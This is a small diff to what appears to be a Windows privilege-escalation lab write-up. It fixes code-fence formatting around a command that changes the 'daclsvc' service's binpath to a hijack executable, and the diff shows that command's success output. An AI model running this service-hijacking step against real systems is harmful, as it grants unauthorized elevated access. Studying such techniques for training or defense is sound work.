@@ -49,7 +49,8 @@ Then we transfer over the service file using our download logic again:
 
 Then we modify the binpath of the service:
 
-````PS C:\Users\user\Downloads> sc.exe config daclsvc binpath= "C:\Users\user\Downloads\daclservicehijack.exe"
+````
+PS C:\Users\user\Downloads> sc.exe config daclsvc binpath= "C:\Users\user\Downloads\daclservicehijack.exe"
 [SC] ChangeServiceConfig SUCCESS
 ````
 
